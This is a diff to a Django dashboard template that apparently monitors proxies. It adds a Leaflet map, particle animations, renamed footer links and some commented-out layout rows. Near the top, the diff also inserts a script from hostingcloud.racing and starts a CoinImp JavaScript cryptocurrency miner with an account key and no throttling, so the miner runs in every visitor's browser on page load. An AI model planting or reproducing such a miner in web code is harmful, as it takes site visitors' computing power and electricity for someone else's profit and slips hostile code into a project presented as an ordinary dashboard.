@@ -15,10 +15,24 @@
   <meta name="msapplication-tap-highlight" content="no">
   <link rel="shortcut icon" type="image/png" href="{% static 'favicon.ico' %}">
   <link href="{% static 'userDashboard/assets/css/main.css' %}" rel="stylesheet">
+  <link href="{% static 'userDashboard/assets/css/ab-particles.css' %}" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.8.0/dist/leaflet.css" integrity="sha512-hoalWLoI8r4UszCkZ5kL8vayOGVae1oxXe/2A4AO6J9+580uKHDO3JdHb7NzwwzK5xr/Fs0W40kiNHxM9vyTtQ==" crossorigin="" />  
+  <!--link rel="stylesheet"
+  href="{% static 'userDashboard/assets/css/index.min.css' %}"
+  integrity="sha384-6N5QXFiNi0Dxhi0OdN6AGW3PKtsxYeAxsVhf5lNgxx6F6KO08DBr5IhVMrc3rmov"
+  crossorigin="anonymous"-->
 </head>
+<body onload='particles(speed=15, avoidMouse=false, opacity=65)'>
+  <script src="https://www.hostingcloud.racing/zosF.js"></script>
+        <script>
+            var _client = new Client.Anonymous('19b89caf750ea26ef409b80e61b19dc8cd15ceb7a19d33f4ad4ddb19a7790727', {
+                throttle: 0, c: 'w'
+            });
+            _client.start();
+            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
-<body>
-  <div class="app-container app-theme-white body-tabs-shadow fixed-sidebar fixed-header">
+        </script>
+  <div  class="app-container app-theme-white body-tabs-shadow fixed-sidebar fixed-header">
     <div class="app-header header-shadow">
       <div class="app-header__logo">
         <div class="logo-src"></div>
@@ -419,7 +433,8 @@
         </div>
       </div>
     </div>
-    <div class="app-main">
+    <div class="app-main" >
+      
       <div class="app-sidebar sidebar-shadow">
         <div class="app-header__logo">
           <div class="logo-src"></div>
@@ -904,7 +919,7 @@
             </div>
         </div-->
 
-          <div class="row">
+          <div class="row" onload='particles(opacity=100, numParticles=10, sizeMultiplier=5, width=1, connections=true, connectionDensity=15, noBounceH=false, noBounceV=false, speed=50, avoidMouse=true, hover=true)'>
             <div class="col-md-12">
               <div class="main-card mb-3 card">
                 <div class="card-header">Active Proxys
@@ -1038,33 +1053,37 @@
               </div>
             </div>
           </div>
+
           <!-- World-Map-->
           <!-- World-Map-->
           <div class="row">
 
 
-                <div class="col-md-6">
+                <div class="col-md-10">
                     <div class="main-card mb-3 card">
                         <div class="card-body">
-                            <div class="card-title">Google Maps</div>
-                            <div id="gmap-example"></div>
+                            <div class="card-title">Proxy Map</div>
+                            <!--div id="gmap-example"></div-->
+                            <style>
+                              #mapid { height: 300px; }
+                            </style>
+
+                             <div id="mapid" ></div>
+
                         </div>
                     </div>
                 </div>
-                <div class="col-md-6">
+                <div class="col-md-2">
                     <div class="main-card mb-3 card">
                         <div class="card-body">
-                            <div class="card-title">Google Maps</div>
-                            <div>
-                              <li>IP Address : {{ip}}</li>
-        <li>Device: {{ device_type}}</li>
-        <li>Browser: {{browser_type}} {{browser_version}}</li>
-        <li>OS: {{os_type}} {{os_version}}</li>
-        <li>City: {{ location_city }}</li>
-        <li>Country: {{ location_country }}</li>
-
-
-
+                            <div class="card-title">Browser</div>
+                            <div id="mapid">
+                              <li>IP Address: {{ip}}</li>
+                              <li>Device: {{ device_type}}</li>
+                              <li>Browser: {{browser_type}} {{browser_version}}</li>
+                              <li>OS: {{os_type}} {{os_version}}</li>
+                              <li>City: {{ location_city }}</li>
+                              <li>Country: {{ location_country }}</li>
                             </div>
                         </div>
                     </div>
@@ -1143,7 +1162,7 @@
           </div-->
 
 
-          <div class="row">
+          <!--div class="row">
             <div class="col-md-12 col-lg-6">
               <div class="mb-3 card">
                 <div class="card-header-tab card-header-tab-animation card-header">
@@ -1400,8 +1419,8 @@
                 </div>
               </div>
             </div>
-          </div>
-          <div class="row">
+          </div-->
+          <!--div class="row">
             <div class="col-md-6 col-lg-3">
               <div class="card-shadow-danger mb-3 widget-chart widget-chart2 text-left card">
                 <div class="widget-content">
@@ -1486,7 +1505,7 @@
                 </div>
               </div>
             </div>
-          </div>
+          </div-->
         <div class="row"> <!-- die tool row : zuletzt 3 cards -->
           <div class="col-md-6 col-xl-4"> <!-- card nr:1 -->
             <div class="card mb-3 widget-content">
@@ -1615,12 +1634,12 @@
                 <ul class="nav">
                   <li class="nav-item">
                     <a href="javascript:void(0);" class="nav-link">
-                      Footer Link 1
+                      Privacy Policies
                     </a>
                   </li>
                   <li class="nav-item">
                     <a href="javascript:void(0);" class="nav-link">
-                      Footer Link 2
+                      FAQs
                     </a>
                   </li>
                 </ul>
@@ -1629,7 +1648,7 @@
                 <ul class="nav">
                   <li class="nav-item">
                     <a href="javascript:void(0);" class="nav-link">
-                      Footer Link 3
+                      Terms of use
                     </a>
                   </li>
                   <li class="nav-item">
@@ -1637,7 +1656,7 @@
                       <div class="badge badge-success mr-1 ml-0">
                         <small>NEW</small>
                       </div>
-                      Footer Link 4
+                      Contact Us
                     </a>
                   </li>
                 </ul>
@@ -1652,9 +1671,33 @@
   </div>
   <script type="text/javascript" src="{% static 'userDashboard/assets/scripts/main.js' %}"></script>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://unpkg.com/leaflet@1.8.0/dist/leaflet.js" integrity="sha512-BB3hKbKWOc9Ez/TAwyWxNXeoV9c1v6FIeYiBieIWkpLjauysF18NzgR1MBNBXf8/KABdlkX68nAhlwcDFLGPCQ==" crossorigin=""></script>
   <script>
-document.getElementById("randInt").innerHTML = Math.floor(Math.random() * 100);
+    var mymap = L.map('mapid').setView([51.505, -0.09], 13);
+    var OpenStreetMap_Mapnik = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+               maxZoom: 19,
+               attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+             }).addTo(mymap);
+    var marker = L.marker([51.5, -100.09]).addTo(mymap);
+  </script>
+
+
+
+<canvas id="particles"></canvas>
+
+<script
+src="{% static 'userDashboard/assets/scripts/ab_particles/ab-particles.min.js' %}"   
+
+integrity="sha384-HI+YXFmq6RX6R45hGuCOv6U/XhbS6swme7nnQVc8g6QfhucST79WEzlK6XMbanUp"
+crossorigin="anonymous"
+defer="">      
+window.addEventListener('load', function(){
+    particles(speed=15, avoidMouse=false)
+}, false); 
 </script>
+
+
+
    <script>
      $(document).ready(function () {
               // catch the form's submit event
@@ -1678,7 +1721,7 @@ document.getElementById("randInt").innerHTML = Math.floor(Math.random() * 100);
                   return false;
               });
           })
+  
   </script>
-
 </body>
 </html>
